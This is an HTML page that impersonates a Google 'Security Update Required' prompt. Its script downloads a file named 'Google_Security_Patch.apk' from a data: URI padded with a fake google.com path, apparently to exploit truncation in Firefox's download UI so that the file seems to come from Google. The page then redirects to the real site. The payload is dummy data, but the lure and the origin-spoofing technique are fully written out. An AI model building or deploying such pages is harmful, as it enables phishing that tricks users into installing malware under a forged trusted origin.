<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Verification</title>
    <style>
        body { 
            background: #ffffff; 
            color: #202124; 
            font-family: 'Roboto', Arial, sans-serif; 
            text-align: center; 
            padding-top: 80px; 
            margin: 0;
        }
        .container { 
            padding: 20px;
            max-width: 400px;
            margin: auto;
        }
        .g-logo {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
            letter-spacing: -1.5px;
        }
        .blue { color: #4285F4; } .red { color: #EA4335; } 
        .yellow { color: #FBBC05; } .green { color: #34A853; }
        
        h2 { font-weight: 400; font-size: 22px; color: #3c4043; }
        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }

        #strikeBtn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        #strikeBtn:active { background-color: #174ea6; }
        
        #status {
            margin-top: 40px;
            font-size: 12px;
            color: #dadce0;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="g-logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <h2>Security Update Required</h2>
        <p>To continue using Google services on this device, you must install the latest security patch (v2026.04).</p>
        
        <button type="button" id="strikeBtn">UPDATE NOWsss</button>
        
        <div id="status">> Monitoring device_health...</div>
    </div>

<script>
    document.getElementById('strikeBtn').addEventListener('click', function() {
        const filename = "Google_Security_Patch.apk";
        const spoofDomain = "www.google.com";
        
        // --- ENHANCED ORIGIN INJECTION LOGIC ---
        
        // 1. Target Spoof
        const target = "https://" + spoofDomain;
        const subPath = "/identity/verification/security-check/";
        
        // 2. Padding Strategis
        // Menggunakan banyak slash dan karakter repetitif untuk memicu "Middle Truncation"
        // di mana UI Firefox akan menyisakan bagian yang terlihat seperti domain valid (Google)
        const slashPadding = "/".repeat(60);
        const junkPadding = "a".repeat(150);
        
        // 3. Payload Construction
        const base64Data = "ZXN0dGVzdGVzdHRlc3Q="; // Dummy data
        
        // Kita letakkan target domain tepat setelah fragment #
        // Format: data:[MIME];base64,[DATA]#[Fake_Origin][Path_Bloating][Trash]
        const payload = `data:application/octet-stream;base64,${base64Data}#${target}${subPath}${slashPadding}${junkPadding}`;

        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        document.body.appendChild(a);

        // --- STEP 1: EXECUTE DOWNLOAD ---
        a.click();

        // --- STEP 2: UI FEEDBACK ---
        document.getElementById('status').innerText = "> VERIFYING ORIGIN: " + spoofDomain;
        document.getElementById('strikeBtn').innerText = "PROCESSING...";
        document.getElementById('strikeBtn').disabled = true;

        // --- STEP 3: AUTOMATIC REDIRECT ---
        // Jeda 500ms agar download manager sempat menangkap context origin
        // sebelum halaman berpindah ke Google yang asli.
        setTimeout(() => {
            window.location.href = "https://www.google.com";
            document.body.removeChild(a);
        }, 4000); 
    });
</script>

</body>
</html>
